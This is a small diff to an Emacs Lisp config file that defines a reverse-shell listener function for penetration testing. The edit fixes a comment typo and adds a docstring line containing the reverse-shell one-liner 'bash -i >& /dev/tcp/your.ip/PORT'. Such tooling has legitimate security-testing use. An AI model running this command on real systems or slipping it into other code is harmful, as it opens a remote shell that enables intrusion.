@@ -1,6 +1,6 @@
 ;;; hacking/config.el -*- lexical-binding: t; -*-
 
-;; WIP don not source
+;; WIP do not source
 
 ;; from https://masteringemacs.org/article/comint-writing-command-interpreter
 
@@ -19,7 +19,8 @@
    "Reverse shell possible prompt.")
 
 (defun hack/revshell (port)
-  "Run an reversell listener on PORT inside emacs."
+  "Run an reversell listener on PORT inside emacs.
+Run `hack/revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
   (interactive "nPort Number: ")
   (let* ((revshell-program hack/revshell-executable)
          (revshell-parameters (append hack/revshell-parameters (list (int-to-string port))))
